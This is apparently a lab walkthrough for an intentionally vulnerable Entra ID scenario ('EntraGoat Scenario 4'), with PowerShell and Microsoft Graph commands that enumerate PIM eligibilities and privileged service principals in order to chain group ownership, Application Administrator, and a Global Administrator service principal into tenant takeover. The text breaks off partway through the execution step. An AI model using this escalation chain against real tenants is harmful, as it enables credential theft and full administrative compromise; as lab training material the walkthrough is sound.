EntraGoat Scenario 4: Walkthrough solution step-by-step

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 4 - I (Eligibly) Own That

Attack flow:

1. The attacker starts as a low-privileged IT support user (Woody Chen).
   He has PIM-eligible ownership of the group "Application Operations Team".

2. Activate eligible ownership and since group owners can manage group membership.
   add yourself (Woody) as a member of the "Application Operations Team" group.

3. That group has an ELIGIBLE Application Administrator directory role.
   Activate the group's eligible Application Administrator assignment via PIM.

4. With Application Administrator, manage the "Infrastructure Monitoring Tool" application:
   Add a client secret to the application and authenticate as the app.

5. The service principal of "Infrastructure Monitoring Tool" is a member of
   the "Global Infrastructure Team" group which has Global Administrator privileges.
 
6. Using these privileges, the attacker resets the admin's password and then logs in to retrieve the scenario flag.

- - -

--> So... why does this work?
- PIM eligibility for ownership enables self-service elevation to group ownership.
- Ownership permits adding oneself as a group member.
- The group's eligible Application Administrator role can be activated via PIM.
- Application Administrator can add credentials to enterprise apps.
- Service principal sits in a group with Global Administrator rights.
- GA privilege allows resetting another user's credentials, even if it's a GA.

.NOTES
Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
you must have the function/BARK toolkit loaded in PS memory to use this function but other tools (or Connect-MgGraph) can be used as well.

# Step 1: Authentication as woody.chen
$UPN = "woody.chen@[YOUR-TENANT-DOMAIN].onmicrosoft.com"
$tenantId = "[YOUR-TENANT-ID]"
$password = "GoatAccess!123"

Connect-MgGraph -Scopes "RoleEligibilitySchedule.Read.Directory"

Get-MgContext

$currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"

# Step 2: Enumeration 
# any owned directory objects by this user? (should be empty)
Get-MgUserOwnedObject -UserId $currentUser.Id -All

# any active role assignments?
Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($currentUser.Id)'" | Select-Object RoleDefinitionId 

# what groups are we a member of (if any)?
$groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
foreach ($groupID in $groupIDs) {
    Get-MgGroup -GroupId $groupID.Id
}

# what about PIM eligible group assignments?
$eligibilities = Invoke-MgGraphRequest -Method GET `
    -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/eligibilitySchedules?`$filter=principalId eq '$($currentUser.Id)'"

$eligibilities.value

# eligible owner. Lets check the group (should be "Application Operations Team"):

$groupID = $eligibilities.value.groupId
$group = Get-MgGroup -GroupId $groupID
$group

# Does the group have any directory role assignments?
# $roleAssignments = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?`$filter=principalId eq '$($group.Id)'&`$expand=roleDefinition"
$roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment  -Filter "principalId eq '$($group.Id)'" -ErrorAction SilentlyContinue
foreach ($assignment in $roleAssignments.value) {
    Write-Host "  Role: $($assignment.roleDefinition.displayName)" 
}

# What about any eligible roles?
# $eligibleRoles = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/roleManagement/directory/roleEligibilitySchedules?`$filter=principalId eq '$($group.Id)'&`$expand=roleDefinition"
$eligibleRoles = Get-MgRoleManagementDirectoryRoleEligibilitySchedule -Filter "principalId eq '$($group.Id)'" -ErrorAction SilentlyContinue
foreach ($eligibleRole in $eligibleRoles) {
    $roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $eligibleRole.RoleDefinitionId
    Write-Host "  Eligible Role: $($roleDef.DisplayName)" 
}

# Eligible Role: Application Administrator!



# Step 3: Building the attack chain

<#
well, just like in scenario 3 but with 2 extra steps:
    1. Activate the eligible ownership of the "Application Operations Team" group and add ourselves as members
    2. Activate the group's eligible Application Administrator role
    from there, we can add creds to any service principal in the tenant, which we'll focus again on SP with PRA, PAA or GA roles for simplicity.
#>

# Before activating anything that could generate noise, 
# let's list all SPs in the tenant that have PRA, PAA or GA roles assigned to verify that our attack path actually leads to an endpoint in the chain.
$roleMap = @{
    "62e90394-69f5-4237-9190-012177145e10" = "Global Administrator"
    "7be44c8a-adaf-4e2a-84d6-ab2649e08a13" = "Privileged Authentication Administrator"
    "e8611ab8-c189-46e8-94e1-60213ab1f814" = "Privileged Role Administrator"
}

Get-MgRoleManagementDirectoryRoleAssignment -All |
  Where-Object { $roleMap.Keys -contains $_.RoleDefinitionId } |
  ForEach-Object  { Get-MgServicePrincipal -ServicePrincipalId $_.PrincipalId -ErrorAction SilentlyContinue } |
  Sort-Object Id -Unique |
  Select-Object DisplayName, AppId, Id

# (None should be returned)

# BUT as seen in scenario 3, 
# We should also enumerate each group holding these roles and identify which of their members are service principals.
$allRoleGroups = Get-MgGroup -All -Filter "isAssignableToRole eq true"
$privilegedGroups = @()
foreach ($group in $allRoleGroups) {
    $roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($group.Id)'" |
             Select-Object -Expand RoleDefinitionId

    if ($roles -contains "62e90394-69f5-4237-9190-012177145e10") {
        Write-Host "$($group.DisplayName) has role: GA" -ForegroundColor Yellow
        $privilegedGroups += $group
    }
    elseif ($roles -contains "7be44c8a-adaf-4e2a-84d6-ab2649e08a13") {
        Write-Host "$($group.DisplayName) has role: PAA" -ForegroundColor Yellow
        $privilegedGroups += $group
    }
    elseif ($roles -contains "e8611ab8-c189-46e8-94e1-60213ab1f814") {
        Write-Host "$($group.DisplayName) has role: PRA" -ForegroundColor Yellow
        $privilegedGroups += $group
    }
}

# quick wrapper to list all members of a group (handles SPs too - uses /beta)
# as Get-MgGroupMember doesn't show SPs on v1.0, so we use a direct API call instead
function Get-GroupMembers {
    param([string]$GroupId)
    return (Invoke-MgGraphRequest -Uri "/beta/groups/$GroupId/members" -Method GET).value
}

# Find SP members in those groups
$targetSPs = @() 
foreach ($group in $privilegedGroups) {
    $members = Get-GroupMembers -GroupId $group.Id
    $spMembers = $members | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.servicePrincipal' }
    foreach ($sp in $spMembers) {
        $targetSPs += [PSCustomObject]@{
            Name = $sp.displayName
            SPId = $sp.id
            AppId = $sp.appId
            GroupName = $group.DisplayName
        }
    }
}
$targetSPs

# Found - Infrastructure Monitoring Tool!

<#
Note:
    Depending on the tenant, there may be multiple service principals holding the PRA, PAA or GA roles. 
    While we could just grab the first result ($targetSPs[0]), for consistency across environments (and to avoid breaking anything)
    we'll target the Infrastructure Monitoring Tool service principal. This SP is guaranteed to exist in every tenant, ensuring all players follow the same path.
#>


# Step 5: Executing the attack path 

# The first step is to activate the eligible ownership of the "Application Operations Team" group and add ourselves as members
$appOpsGroup = Get-MgGroup -Filter "displayName eq 'Application Operations Team'"

<#
The following step can also be done via the UI:
    1. entra.microsoft.com -> ID Governance -> Privileged Access Management -> My roles -> Groups
    2. Eligible assignments tab
    3. Click Activate on the wanted group -> fill Reason ("very important tasks ahead") -> Activate.
    4. Wait ~ 30 seconds -> re-sign-in or refresh token; role shows as Active.
    5. Add yourself as a member through group management.
